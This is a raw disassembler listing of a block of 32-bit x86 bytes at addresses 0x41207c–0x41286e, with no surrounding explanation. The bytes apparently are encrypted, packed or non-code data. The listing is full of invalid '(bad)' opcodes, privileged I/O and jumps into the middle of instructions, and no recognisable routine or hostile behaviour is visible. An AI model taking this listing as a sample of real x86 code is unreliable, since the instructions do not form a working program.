  41207c:	pop    esp
  41207d:	pop    edx
  41207e:	mov    eax,0x8b5ec51a
  412083:	xor    eax,0x65cae7eb
  412088:	(bad)  
  412089:	jge    0x41201a
  41208b:	into   
  41208c:	shl    DWORD PTR [edx],0xb6
  41208f:	or     dl,ch
  412091:	sar    DWORD PTR [ecx],cl
  412093:	imul   eax,esp,0xffffffff
  412096:	je     0x41210e
  412098:	xlat   BYTE PTR ds:[ebx]
  412099:	scas   eax,DWORD PTR es:[edi]
  41209a:	stc    
  41209b:	scas   eax,DWORD PTR es:[edi]
  41209c:	or     al,0x6
  41209e:	in     eax,0x28
  4120a0:	xchg   edx,eax
  4120a1:	sbb    ebx,edi
  4120a3:	jb     0x4120b6
  4120a5:	jecxz  0x4120cd
  4120a7:	(bad)  
  4120a8:	jne    0x412061
  4120aa:	xchg   esp,eax
  4120ab:	pusha  
  4120ac:	xchg   ebx,eax
  4120ad:	fwait
  4120ae:	(bad)  
  4120af:	enter  0x23,0x21
  4120b3:	mov    eax,ds:0x43b90351
  4120b8:	in     eax,0x4f
  4120ba:	mov    esi,DWORD PTR [ebp+0x1]
  4120bd:	gs cld 
  4120bf:	cmp    edi,DWORD PTR [esi]
  4120c1:	sbb    BYTE PTR [esi],bl
  4120c3:	scas   al,BYTE PTR es:[edi]
  4120c4:	pop    ds
  4120c5:	xchg   ebx,eax
  4120c6:	xchg   ebx,eax
  4120c7:	and    bh,dh
  4120c9:	int3   
  4120ca:	mov    ds:0x6c5cedd,al
  4120cf:	jne    0x4120f7
  4120d1:	mov    edx,0x9d3a0bfe
  4120d6:	icebp  
  4120d7:	pop    ebx
  4120d8:	gs (bad) 
  4120da:	xchg   ecx,eax
  4120db:	push   edx
  4120dc:	shl    BYTE PTR [esi+0xf],0x77
  4120e0:	test   BYTE PTR [edi-0x4d],cl
  4120e3:	ret    
  4120e4:	adc    BYTE PTR [ebp+edx*4+0x1b],0x4e
  4120e9:	pop    esp
  4120ea:	ret    
  4120eb:	rcr    edi,1
  4120ed:	in     eax,dx
  4120ee:	lds    edx,FWORD PTR [eax]
  4120f0:	(bad)  
  4120f1:	dec    esi
  4120f2:	add    BYTE PTR [ebx+0x1b],dl
  4120f5:	cmp    eax,0xfbc5f891
  4120fa:	cld    
  4120fb:	sub    BYTE PTR [edx+0x54cfa978],ah
  412101:	dec    esp
  412102:	cmp    al,ah
  412104:	mov    bh,0x7d
  412106:	add    bh,BYTE PTR [edx-0x55be04e7]
  41210c:	sbb    eax,0x868d4e5d
  412111:	and    BYTE PTR [edx-0x71844cc3],bl
  412117:	in     al,dx
  412118:	sbb    ecx,DWORD PTR [eax+0x9e294e1]
  41211e:	in     eax,0xff
  412120:	add    bl,BYTE PTR [edx]
  412122:	mov    dh,0x1a
  412124:	xlat   BYTE PTR ds:[ebx]
  412125:	repnz (bad) 
  412127:	stc    
  412128:	mov    ss,WORD PTR ds:0x860bf00f
  41212e:	push   ss
  41212f:	push   cs
  412130:	jle    0x4120c1
  412132:	add    DWORD PTR [esi-0x45],0xffffffc7
  412136:	or     DWORD PTR [esi-0x4eb80685],0x57fc248d
  412140:	pop    es
  412141:	xchg   bh,ch
  412143:	dec    edx
  412144:	jmp    0x4121a3
  412146:	add    eax,0xd41dc24a
  41214b:	ret    
  41214c:	movlhps xmm1,xmm2
  41214f:	adc    edi,DWORD PTR [edx+0x6372a812]
  412155:	dec    eax
  412156:	pop    ebx
  412157:	mov    edx,0xb1a21cdd
  41215c:	or     DWORD PTR [ebx-0x6700e501],ebx
  412162:	mov    edi,0x7a193481
  412167:	sbb    eax,0x905e81a
  41216c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41216d:	and    BYTE PTR [edx],dl
  41216f:	(bad)  
  412170:	stc    
  412171:	mov    esp,DWORD PTR [esi+0x3707a2a1]
  412177:	in     al,0xcc
  412179:	and    eax,0x89aec942
  41217e:	mov    ch,BYTE PTR [esp+esi*4+0x1]
  412182:	and    DWORD PTR [eax-0x2d6eef18],edx
  412188:	xchg   esi,eax
  412189:	sub    eax,0x7a46e314
  41218e:	repnz push esi
  412190:	dec    esp
  412191:	or     eax,0x61c0ceb8
  412196:	push   es
  412197:	mov    bh,0x38
  412199:	ins    DWORD PTR es:[edi],dx
  41219a:	pop    ebx
  41219b:	(bad)  
  41219c:	nop
  41219d:	outs   dx,BYTE PTR ds:[esi]
  41219e:	fiadd  DWORD PTR [edx-0x7c7dc106]
  4121a4:	out    dx,al
  4121a5:	xchg   esi,eax
  4121a6:	jns    0x412168
  4121a8:	jle    0x41220e
  4121aa:	stos   BYTE PTR es:[edi],al
  4121ab:	mov    ah,0x30
  4121ad:	stos   DWORD PTR es:[edi],eax
  4121ae:	cmc    
  4121af:	mov    eax,ds:0xba6a1b55
  4121b4:	sub    DWORD PTR [ecx-0x41],esi
  4121b7:	stc    
  4121b8:	or     BYTE PTR [edi+0x74],cl
  4121bb:	imul   eax,DWORD PTR [eax],0xfffffff6
  4121be:	mov    eax,ds:0x1161c688
  4121c3:	inc    ebp
  4121c4:	das    
  4121c5:	mov    BYTE PTR [esi],bh
  4121c7:	loope  0x41215c
  4121c9:	je     0x412194
  4121cb:	mov    ds,ecx
  4121cd:	sbb    esp,DWORD PTR [esp]
  4121d0:	sub    BYTE PTR [eax-0x2a],ah
  4121d3:	push   esp
  4121d4:	adc    DWORD PTR ds:0xec0ac1cb,eax
  4121da:	data16 shl BYTE PTR [edx-0x29],cl
  4121de:	inc    edx
  4121df:	rcl    DWORD PTR [ecx+0x4c],cl
  4121e2:	addr16 mov esi,0xf61ce56c
  4121e8:	addr16 out 0x52,al
  4121eb:	pop    ebp
  4121ec:	es (bad) 
  4121ee:	add    eax,0x4806ae71
  4121f3:	push   ebx
  4121f4:	aam    0x6
  4121f6:	jg     0x4121a2
  4121f8:	out    0x2,al
  4121fa:	out    dx,eax
  4121fb:	cmp    al,0x76
  4121fd:	xlat   BYTE PTR ds:[ebx]
  4121fe:	int3   
  4121ff:	sbb    esp,edi
  412201:	push   edx
  412202:	(bad)  
  412203:	sbb    ebp,esi
  412205:	addr16 adc eax,0xda9fe637
  41220b:	mov    ?,WORD PTR [edx-0x72]
  41220e:	ja     0x4121cd
  412210:	sbb    eax,0xf2b2a128
  412215:	xor    DWORD PTR [edi+0x697d6ab5],0xffffffee
  41221c:	call   0x4b7c:0xb85cfea4
  412223:	xor    eax,0xb4566f27
  412228:	mov    al,ds:0x39c70148
  41222d:	aas    
  41222e:	std    
  41222f:	das    
  412230:	dec    edi
  412231:	outs   dx,BYTE PTR ds:[esi]
  412232:	call   0x6781:0xbee93154
  412239:	sbb    al,ah
  41223b:	inc    ebp
  41223c:	outs   dx,DWORD PTR ds:[esi]
  41223d:	mov    esi,0xe9bc63eb
  412242:	jb     0x412250
  412244:	shl    DWORD PTR [ecx],1
  412246:	addr16 sbb ecx,ebp
  412249:	ret    
  41224a:	or     eax,DWORD PTR [eax]
  41224c:	mov    ah,0x7
  41224e:	jo     0x4121f7
  412250:	cdq    
  412251:	inc    esi
  412252:	je     0x4121d7
  412254:	xchg   BYTE PTR [eax+ebp*1-0x342c39a],bl
  41225b:	mov    edi,0x17b62902
  412260:	mov    ah,0x31
  412262:	push   edx
  412263:	cmp    BYTE PTR ds:0x3bb0d58f,0x78
  41226a:	mov    cl,0xc8
  41226c:	cmp    eax,0x5bc1ec00
  412271:	imul   ebp,DWORD PTR [esp+ebx*1-0x4bcd6623],0xf
  412279:	dec    BYTE PTR ds:0x79dee816
  41227f:	mov    ah,0xdc
  412281:	clc    
  412282:	mov    bh,0x9c
  412284:	mov    edi,0x5e72887
  412289:	mov    ah,0x8e
  41228b:	mov    ebx,0xbc7c86bf
  412290:	in     al,dx
  412291:	push   ebx
  412292:	(bad)  
  412293:	or     cl,ah
  412295:	outs   dx,BYTE PTR ds:[esi]
  412296:	xor    bh,cl
  412298:	jnp    0x4122e3
  41229a:	ins    DWORD PTR es:[edi],dx
  41229b:	xchg   edx,eax
  41229c:	jge    0x41222f
  41229e:	lods   al,BYTE PTR ds:[esi]
  41229f:	mov    bh,0xd6
  4122a1:	dec    ebx
  4122a2:	bound  edi,QWORD PTR [ebp+0x10]
  4122a5:	imul   esi,DWORD PTR [ebx+esi*2-0x3f],0x255cf035
  4122ad:	rol    esi,1
  4122af:	data16 jae 0x4122f3
  4122b2:	xchg   esp,eax
  4122b3:	mov    ch,0xe7
  4122b5:	cli    
  4122b6:	dec    esp
  4122b7:	fwait
  4122b8:	mov    bl,0x6
  4122ba:	cmp    DWORD PTR [ebx-0x1ff4753d],ecx
  4122c0:	sub    al,ch
  4122c2:	or     BYTE PTR [ebp-0x34],al
  4122c5:	loop   0x412336
  4122c7:	hlt    
  4122c8:	lock mov ebx,0x48b2aedb
  4122ce:	test   ah,ah
  4122d0:	cmp    eax,edi
  4122d2:	pushf  
  4122d3:	xor    cl,BYTE PTR [edi]
  4122d5:	bnd jge 0x412287
  4122d8:	sbb    al,0x92
  4122da:	retf   
  4122db:	icebp  
  4122dc:	fwait
  4122dd:	ja     0x41234f
  4122df:	enter  0x715d,0x77
  4122e3:	pop    esp
  4122e4:	fidiv  DWORD PTR ds:0xe38c95ff
  4122ea:	inc    ebx
  4122eb:	cmp    al,0x81
  4122ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ee:	cmp    eax,DWORD PTR [ebx+0x6362241a]
  4122f4:	add    eax,0x53e49621
  4122f9:	jbe    0x4122ac
  4122fb:	(bad)  
  4122fc:	pop    eax
  4122fd:	jmp    0xd41e4f7d
  412302:	lock mov edi,0x97597dd3
  412308:	popf   
  412309:	cli    
  41230a:	imul   ecx,DWORD PTR [edi],0x6635c6f5
  412310:	cmc    
  412311:	inc    esi
  412312:	mov    dl,0x2f
  412314:	es add eax,0x4c6e5ba7
  41231a:	xchg   edx,eax
  41231b:	loop   0x412311
  41231d:	repz or dh,bh
  412320:	xchg   esp,eax
  412321:	(bad)  
  412322:	dec    eax
  412323:	xchg   edi,eax
  412324:	xor    esp,DWORD PTR [ebx-0x50552eb9]
  41232a:	cdq    
  41232b:	or     BYTE PTR ds:0x5620b170,dh
  412331:	loop   0x41233e
  412333:	mov    ds:0x5af11ffe,eax
  412338:	lahf   
  412339:	fcmovu st,st(5)
  41233b:	fistp  WORD PTR [edi]
  41233d:	dec    ecx
  41233e:	aam    0x75
  412340:	in     al,dx
  412341:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  412343:	or     ch,BYTE PTR [ecx+esi*2+0x37]
  412347:	adc    ah,BYTE PTR [eax]
  412349:	imul   ecx,DWORD PTR ds:[edx+0x7bbecf86],0x28
  412351:	xchg   edx,eax
  412352:	xchg   ebp,eax
  412353:	pop    ds
  412354:	bound  esi,QWORD PTR [edi-0x48790027]
  41235a:	ror    DWORD PTR [ebp+edx*1-0x13],cl
  41235e:	stos   BYTE PTR es:[edi],al
  41235f:	push   ebp
  412360:	bnd call DWORD PTR [ebx]
  412363:	pop    edi
  412364:	cmp    eax,0x1a0a12e1
  412369:	mov    ch,0x9
  41236b:	jle    0x4123de
  41236d:	mov    ds:0x97c02e25,al
  412372:	test   bh,bl
  412374:	sbb    ch,dh
  412376:	(bad)
  41237b:	outs   dx,BYTE PTR ds:[esi]
  41237c:	aad    0x42
  41237e:	push   edi
  41237f:	mov    dh,0xda
  412381:	xchg   ecx,eax
  412382:	jp     0x4123cf
  412384:	(bad)  
  412385:	mov    edx,0x95b38fb5
  41238a:	clc    
  41238b:	mov    ss,edx
  41238d:	inc    eax
  41238e:	leave  
  41238f:	cs mov edi,0x69246950
  412395:	cdq    
  412396:	jmp    0x4123a3
  412398:	in     eax,0x3c
  41239a:	pop    esi
  41239b:	cmp    al,0xac
  41239d:	aas    
  41239e:	clc    
  41239f:	sub    ebp,DWORD PTR [ebp-0x45]
  4123a2:	enter  0xdaf7,0x87
  4123a6:	out    0xa0,al
  4123a8:	dec    ebx
  4123a9:	(bad)  
  4123aa:	pop    eax
  4123ab:	cwde   
  4123ac:	test   DWORD PTR [ebx+0x7335ddd6],eax
  4123b2:	mov    ebx,0x1dc77626
  4123b7:	push   esp
  4123b8:	das    
  4123b9:	(bad)  
  4123ba:	mov    al,ds:0x4be9ce12
  4123bf:	stos   DWORD PTR es:[edi],eax
  4123c0:	ins    BYTE PTR es:[edi],dx
  4123c1:	pop    ebp
  4123c2:	test   BYTE PTR [edx],al
  4123c4:	pop    ecx
  4123c5:	and    eax,0x8d9769f0
  4123ca:	push   edi
  4123cb:	cli    
  4123cc:	cli    
  4123cd:	mov    bh,0x73
  4123cf:	movd   mm5,DWORD PTR es:[edx-0x27]
  4123d4:	cmp    DWORD PTR [edx-0x5a39c34b],esi
  4123da:	pop    ss
  4123db:	mov    ebp,eax
  4123dd:	shl    eax,1
  4123df:	inc    ebx
  4123e0:	ds inc eax
  4123e2:	pusha  
  4123e3:	(bad)  
  4123e4:	popa   
  4123e5:	pop    eax
  4123e6:	jns    0x4123a8
  4123e8:	xor    BYTE PTR [esi+0x1b],0x65
  4123ec:	in     eax,0xb6
  4123ee:	(bad)  
  4123ef:	jmp    0xbfd8:0x6b8fb83e
  4123f6:	test   eax,0x548b6a5a
  4123fb:	ss pushf 
  4123fd:	or     eax,0x4156204d
  412402:	sti    
  412403:	lock nop
  412405:	xchg   ebx,eax
  412406:	xchg   ecx,eax
  412407:	ss (bad) 
  412409:	mov    ebx,0xa487433d
  41240e:	sub    BYTE PTR [eax-0x4e3a0cae],al
  412414:	fimul  DWORD PTR [eax-0x61a91a09]
  41241a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41241b:	add    eax,0xcd132fa3
  412420:	rcl    dl,1
  412422:	fdivr  DWORD PTR [ebp-0x2598d484]
  412428:	cdq    
  412429:	imul   eax,DWORD PTR [edx+esi*8],0xd927808d
  412430:	or     BYTE PTR [eax],al
  412432:	adc    dl,BYTE PTR [eax+0x7c]
  412435:	(bad)  
  412436:	call   0x61d22344
  41243b:	not    BYTE PTR ds:0x238e0588
  412441:	inc    ebx
  412442:	out    dx,al
  412443:	scas   al,BYTE PTR es:[edi]
  412444:	mov    ah,0x11
  412446:	ins    BYTE PTR es:[edi],dx
  412447:	fidivr WORD PTR [ecx-0x7fa22b22]
  41244d:	stos   DWORD PTR es:[edi],eax
  41244e:	mov    edx,0x305c9b5
  412453:	mov    cl,BYTE PTR [eax]
  412455:	sti    
  412456:	(bad)  
  412457:	popa   
  412458:	fcom   DWORD PTR [ebp-0x5842e212]
  41245e:	mov    ah,0xf9
  412460:	and    al,0x81
  412462:	lock das 
  412464:	cmc    
  412465:	and    dl,BYTE PTR [eax]
  412467:	loopne 0x412462
  412469:	scas   al,BYTE PTR es:[edi]
  41246a:	ja     0x412447
  41246c:	addr16 (bad) 
  41246e:	rcr    cl,1
  412470:	push   cs
  412471:	push   eax
  412472:	mov    cl,0xf
  412474:	retf   0x735
  412477:	dec    ebp
  412478:	cwde   
  412479:	mov    ds:0x87a9e09b,eax
  41247e:	jl     0x4124fa
  412480:	scas   eax,DWORD PTR es:[edi]
  412481:	mov    bh,0xbf
  412483:	jo     0x412486
  412485:	aas    
  412486:	dec    esp
  412487:	pop    esp
  412488:	xchg   esi,eax
  412489:	idiv   al
  41248b:	(bad)  
  41248c:	sub    eax,0x67d76b03
  412491:	pop    esi
  412492:	daa    
  412493:	mov    bh,0xa
  412495:	ficomp WORD PTR [ebx+0x73]
  412498:	jg     0x412461
  41249a:	adc    eax,edi
  41249c:	xor    edx,DWORD PTR [ecx+0x738a14f6]
  4124a2:	xor    bl,dl
  4124a4:	daa    
  4124a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124a6:	push   edx
  4124a7:	outs   dx,DWORD PTR ds:[esi]
  4124a8:	xchg   ebp,eax
  4124a9:	inc    ebp
  4124aa:	mov    cl,0x7e
  4124ac:	call   0xfa73c7c4
  4124b1:	jae    0x4124f8
  4124b3:	add    esi,ecx
  4124b5:	ret    0x6048
  4124b8:	in     eax,dx
  4124b9:	repz or dl,BYTE PTR [ecx-0x22b4ad1f]
  4124c0:	out    dx,al
  4124c1:	mov    WORD PTR [eax-0x6671a344],ds
  4124c7:	or     DWORD PTR [edx],ecx
  4124c9:	fsub   st,st(5)
  4124cb:	jp     0x412529
  4124cd:	mov    esi,0x748ae363
  4124d2:	ins    BYTE PTR es:[edi],dx
  4124d3:	xor    DWORD PTR [edx+0x29],0x5e
  4124d7:	(bad)  
  4124d8:	std    
  4124d9:	pop    es
  4124da:	mov    cs,WORD PTR [edx+0x3f12b3a9]
  4124e0:	mov    cl,0xc3
  4124e2:	call   0xbe62:0xfc41040c
  4124e9:	stc    
  4124ea:	pop    edi
  4124eb:	fucomip st,st(4)
  4124ed:	call   0x8269ccd5
  4124f2:	mov    cx,0xcaac
  4124f6:	pop    ss
  4124f7:	jae    0x4124f6
  4124f9:	loope  0x4124e4
  4124fb:	inc    ebp
  4124fc:	mov    WORD PTR [esi-0x32704f55],?
  412502:	fisttp DWORD PTR [ebp+0x61165303]
  412508:	call   0x2d84:0x2358c22a
  41250f:	xchg   BYTE PTR [edx+0x58],al
  412512:	in     al,0x3f
  412514:	mov    ebx,0x87a63f9d
  412519:	stos   DWORD PTR es:[edi],eax
  41251a:	ficom  WORD PTR [ecx+0x2d0ba85]
  412520:	sbb    eax,0x1e692fed
  412525:	daa    
  412526:	scas   al,BYTE PTR es:[edi]
  412527:	(bad)
  41252b:	add    ebp,ebx
  41252d:	lds    esp,FWORD PTR [ebx]
  41252f:	scas   al,BYTE PTR es:[edi]
  412530:	or     eax,0x3d9cffb2
  412535:	fisubr WORD PTR [eax-0x3c39c714]
  41253b:	xchg   BYTE PTR [esi],dh
  41253d:	jge    0x412588
  41253f:	mov    bh,0xcd
  412541:	(bad)  
  412542:	xlat   BYTE PTR ds:[ebx]
  412543:	popa   
  412544:	ins    DWORD PTR es:[edi],dx
  412545:	add    esi,DWORD PTR [ebp+0x5ea8f8d5]
  41254b:	scas   al,BYTE PTR es:[edi]
  41254c:	sti    
  41254d:	lds    esi,FWORD PTR [eax-0xc414891]
  412553:	iret   
  412554:	pop    esi
  412555:	cmp    esp,ebp
  412557:	fmul   st(4),st
  412559:	inc    edi
  41255a:	jae    0x412521
  41255c:	mov    edi,0x75b2916
  412561:	imul   ebx,DWORD PTR [esp+ebx*1-0x484e2656],0x4b
  412569:	das    
  41256a:	mov    ebp,0x6f23ccdb
  41256f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412570:	mov    esp,0xc1e8775a
  412575:	pop    ebx
  412576:	push   eax
  412577:	sbb    eax,0x62e0d96d
  41257c:	or     dl,ch
  41257e:	mov    dl,0xfe
  412580:	icebp  
  412581:	ins    BYTE PTR es:[edi],dx
  412582:	xchg   ecx,eax
  412583:	retf   0x98f4
  412586:	inc    edi
  412587:	or     eax,0x78e8d035
  41258c:	sbb    dl,BYTE PTR ds:0xe68bb392
  412592:	push   0x854187f8
  412597:	xchg   bh,bl
  412599:	pop    esi
  41259a:	push   ecx
  41259b:	or     edi,DWORD PTR [esi]
  41259d:	push   ds
  41259e:	retf   0x3cd
  4125a1:	call   0xdcb1eb0
  4125a6:	add    BYTE PTR [ebx+esi*8+0x306ab417],0x60
  4125ae:	mov    WORD PTR [ebp+0x47],?
  4125b1:	enter  0x859,0xe7
  4125b5:	scas   al,BYTE PTR es:[edi]
  4125b6:	out    0xfd,eax
  4125b8:	test   eax,0x7176cf60
  4125be:	popf   
  4125bf:	push   edx
  4125c0:	mov    bl,0x82
  4125c2:	or     BYTE PTR ds:0x38809efd,bl
  4125c8:	mov    edi,0x5fb64f7a
  4125cd:	inc    edx
  4125ce:	fs xchg edi,eax
  4125d0:	inc    ebp
  4125d1:	jmp    0x3359e433
  4125d6:	inc    eax
  4125d7:	in     al,dx
  4125d8:	or     BYTE PTR [ebx+0x2061d873],0xa7
  4125df:	cmp    ecx,esp
  4125e1:	(bad)  
  4125e3:	fs mov cl,0xd6
  4125e6:	fstp   st(4)
  4125e8:	mov    bl,0x37
  4125ea:	sub    BYTE PTR [ebx-0x45],dh
  4125ed:	int3   
  4125ee:	icebp  
  4125ef:	inc    eax
  4125f0:	inc    eax
  4125f1:	inc    esp
  4125f2:	sbb    ecx,edi
  4125f4:	cli    
  4125f5:	in     al,0x17
  4125f7:	imul   esi,DWORD PTR [edx+0x9547cf5],0x73
  4125fe:	sbb    dh,dh
  412600:	retf   
  412601:	xlat   BYTE PTR ds:[ebx]
  412602:	push   0xf3d6ea9b
  412607:	lods   al,BYTE PTR ds:[esi]
  412608:	sar    DWORD PTR [ebx+0x124139f2],cl
  41260e:	or     bl,BYTE PTR [edi-0x5a8c3280]
  412614:	mov    esi,0x3b336217
  412619:	sub    al,0x90
  41261b:	cmp    ecx,ecx
  41261d:	(bad)  
  41261f:	jno    0x412648
  412621:	dec    esi
  412622:	loop   0x41264e
  412624:	test   edi,0xcbcd7836
  41262a:	arpl   WORD PTR [edi+ebx*8],bx
  41262d:	data16 or ch,BYTE PTR [eax+0x65530c10]
  412634:	fadd   DWORD PTR [eax+0x233b954d]
  41263a:	adc    eax,0x12481797
  41263f:	imul   ebp,DWORD PTR [esi+0x3f],0x14
  412643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412644:	pop    edx
  412645:	and    dl,BYTE PTR [edx+0x29]
  412648:	outs   dx,DWORD PTR ds:[esi]
  412649:	clc    
  41264a:	sbb    DWORD PTR [ebx],eax
  41264c:	mov    dl,0xf7
  41264e:	mov    ds:0x88fc085e,eax
  412653:	mov    ebx,0x6448f9fa
  412658:	ret    0xc520
  41265b:	test   DWORD PTR [esi],ebx
  41265d:	imul   ebp,DWORD PTR [ebx-0x52],0x1f71164b
  412664:	fstp   DWORD PTR [esi-0x10]
  412667:	or     ebp,DWORD PTR [ebx+esi*1-0x5c0ce6d6]
  41266e:	fld    DWORD PTR [eax]
  412670:	int3   
  412671:	pusha  
  412672:	loope  0x412656
  412674:	out    dx,eax
  412675:	adc    eax,0x7f1025f3
  41267a:	inc    ebp
  41267b:	call   0xd3a8:0xdc6339cf
  412682:	sub    BYTE PTR [esi+0x10],0xe2
  412686:	xchg   esi,eax
  412687:	test   DWORD PTR [ecx+ebp*8],0x936fbe32
  41268e:	lea    edx,[di-0x5c8f]
  412693:	fcom   QWORD PTR [ecx+0x3d]
  412696:	or     al,0x37
  412698:	add    esp,ebp
  41269a:	repz neg BYTE PTR es:[ecx-0x37]
  41269f:	out    0x2,eax
  4126a1:	popa   
  4126a2:	outs   dx,BYTE PTR ds:[esi]
  4126a3:	jg     0x4126be
  4126a5:	sahf   
  4126a6:	repz fistp QWORD PTR [esi-0x6ca5f969]
  4126ad:	or     al,0x6a
  4126af:	jbe    0x412697
  4126b1:	xchg   ebx,eax
  4126b2:	hlt    
  4126b3:	and    eax,0x3f81b750
  4126b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126b9:	retf   
  4126ba:	adc    ecx,ebp
  4126bc:	mov    esi,0xbab98694
  4126c1:	mov    DWORD PTR [bp+di+0x16],esp
  4126c5:	iret   
  4126c6:	sub    eax,0x1d339435
  4126cb:	adc    al,0x95
  4126cd:	not    BYTE PTR [edi+0x18]
  4126d0:	mov    dh,BYTE PTR [edi-0x54b63243]
  4126d6:	aad    0xb7
  4126d8:	ins    DWORD PTR es:[edi],dx
  4126d9:	loope  0x412749
  4126db:	out    dx,eax
  4126dc:	xchg   edi,eax
  4126dd:	ss inc ebp
  4126df:	shr    BYTE PTR [edi-0x763e891a],cl
  4126e5:	and    ecx,ebx
  4126e7:	xchg   edi,eax
  4126e8:	mov    bl,cl
  4126ea:	lea    ecx,[edx-0x15]
  4126ed:	xchg   edi,eax
  4126ee:	jmp    0x703eacda
  4126f3:	pop    esi
  4126f4:	mov    BYTE PTR [esi+0x7f],0xf4
  4126f8:	mov    ebp,0x4e7238e5
  4126fd:	loopne 0x412687
  4126ff:	mov    al,ds:0x8ab3424
  412704:	sub    esp,eax
  412706:	and    bh,bl
  412708:	inc    eax
  412709:	inc    edx
  41270a:	cmp    al,0xd5
  41270c:	dec    eax
  41270d:	and    ah,BYTE PTR [ebx-0x3f]
  412710:	mov    ds:0xf0b1c032,eax
  412715:	and    ebx,DWORD PTR [esp+ecx*8]
  412718:	rcr    BYTE PTR [edi+eiz*2],0xb3
  41271c:	pop    eax
  41271d:	aam    0x93
  41271f:	pop    ecx
  412720:	popf   
  412721:	and    bh,BYTE PTR [ebp-0xb]
  412724:	or     DWORD PTR [edx-0x79],ecx
  412727:	into   
  412728:	jne    0x41272c
  41272a:	jle    0x412714
  41272c:	nop
  41272d:	push   esp
  41272e:	pusha  
  41272f:	inc    esp
  412730:	mov    bh,0x86
  412732:	add    BYTE PTR [ebx-0x12],bh
  412735:	xchg   esp,eax
  412736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412737:	or     al,0xf6
  412739:	sti    
  41273a:	pop    esi
  41273b:	adc    al,0x68
  41273d:	ror    esp,cl
  41273f:	fnsave ds:0x68f1f80c
  412745:	leave  
  412746:	je     0x412797
  412748:	cmp    eax,0x8ee7492d
  41274d:	xlat   BYTE PTR ds:[ebx]
  41274e:	and    al,0x33
  412750:	or     ah,dl
  412752:	mov    ebp,0x4f5d8722
  412757:	ds jo  0x4127bc
  41275a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41275b:	nop
  41275c:	inc    edx
  41275d:	pop    ds
  41275e:	pop    ebx
  41275f:	popf   
  412760:	call   0x9720b9f8
  412765:	or     esi,ebp
  412767:	dec    edx
  412768:	scas   eax,DWORD PTR es:[edi]
  412769:	test   eax,0x3300fad0
  41276e:	retf   
  41276f:	xor    eax,0xe7d5764b
  412774:	pop    esi
  412775:	in     al,dx
  412776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412777:	cli    
  412778:	inc    ebp
  412779:	lods   eax,DWORD PTR ds:[esi]
  41277a:	fldcw  WORD PTR [ebp+0x101c669d]
  412780:	jne    0x41276c
  412782:	int    0x73
  412784:	pushf  
  412785:	ror    DWORD PTR [ecx+0xc],cl
  412788:	and    eax,0xe96252b4
  41278d:	mov    edx,DWORD PTR ds:0xbbf2bb5d
  412793:	call   0x4ffb481e
  412798:	data16 stos BYTE PTR es:[edi],al
  41279a:	jle    0x4127e4
  41279c:	das    
  41279d:	loopne 0x412778
  41279f:	test   BYTE PTR fs:[ebx],dh
  4127a2:	cld    
  4127a3:	jg     0x412784
  4127a5:	mov    ah,0x2f
  4127a7:	mov    edx,0x15fe84d0
  4127ac:	xor    DWORD PTR [edi-0x3ed1a233],0xffffffcd
  4127b3:	push   ebx
  4127b4:	push   0xffffff8d
  4127b6:	mov    edi,0xd37fae2
  4127bb:	cmp    dh,BYTE PTR [edx-0x4c]
  4127be:	imul   cl
  4127c0:	aad    0xde
  4127c2:	push   esp
  4127c3:	inc    esp
  4127c4:	cmc    
  4127c5:	pop    esi
  4127c6:	mov    ds:0x4fab1d64,eax
  4127cb:	mov    WORD PTR [ecx+0x18a09708],ss
  4127d1:	call   0x8b3fbf39
  4127d6:	xor    ah,BYTE PTR [edx-0x77]
  4127d9:	loopne 0x4127f3
  4127db:	jle    0x4127e0
  4127dd:	push   0x3f9cb0ab
  4127e2:	add    DWORD PTR gs:[edi],edi
  4127e5:	clc    
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	pop    esp
  4127e8:	adc    al,0x2b
  4127ea:	sahf   
  4127eb:	jae    0x4127d7
  4127ed:	in     eax,0xa0
  4127ef:	push   ebx
  4127f0:	(bad)  
  4127f1:	push   0xffffffaa
  4127f3:	pop    edi
  4127f4:	add    eax,0xae3ac8bd
  4127f9:	aaa    
  4127fa:	inc    edx
  4127fb:	rol    DWORD PTR [ebx],0x91
  4127fe:	sbb    BYTE PTR [ebp-0x71],dh
  412801:	inc    ebx
  412802:	popa   
  412803:	pop    edx
  412804:	js     0x4127b8
  412806:	jl     0x41282e
  412808:	and    BYTE PTR [edx+0x7],0xc9
  41280c:	mov    cl,bh
  41280e:	cmp    al,0xba
  412810:	fmul   QWORD PTR [ebx+0x652f0d63]
  412816:	bound  esi,QWORD PTR [edi-0xe5e7dd4]
  41281c:	mov    ?,WORD PTR [ebp-0x3e]
  41281f:	xchg   esi,eax
  412820:	lds    ebx,FWORD PTR [ecx-0x34af8a7]
  412826:	je     0x41281a
  412828:	mov    ebp,0xd6d87c47
  41282d:	jno    0x41285e
  41282f:	jo     0x4127e4
  412831:	dec    esp
  412832:	scas   al,BYTE PTR es:[edi]
  412833:	dec    esi
  412834:	jae    0x4127ef
  412836:	jmp    0xfac3d701
  41283b:	pop    edi
  41283c:	pop    edx
  41283d:	sbb    DWORD PTR [edx+eiz*8+0x1a],eax
  412841:	add    DWORD PTR [ecx],esp
  412843:	pop    eax
  412844:	out    0xf0,al
  412846:	dec    esi
  412847:	push   0xffffffb9
  412849:	push   0xffffffa4
  41284b:	retf   0x8a97
  41284e:	loopne 0x412847
  412850:	and    DWORD PTR [esi+0xdcbdd4c],edi
  412856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412858:	jo     0x41287e
  41285a:	xor    bl,BYTE PTR [ebx+eax*2+0x1a688a56]
  412861:	push   es
  412862:	ins    BYTE PTR es:[edi],dx
  412863:	cs pop esp
  412865:	dec    esi
  412866:	inc    eax
  412867:	ins    BYTE PTR es:[edi],dx
  412868:	aaa    
  412869:	ins    BYTE PTR es:[edi],dx
  41286a:	sahf   
  41286b:	or     dh,ch
  41286d:	push   ds
  41286e:	inc    ebx
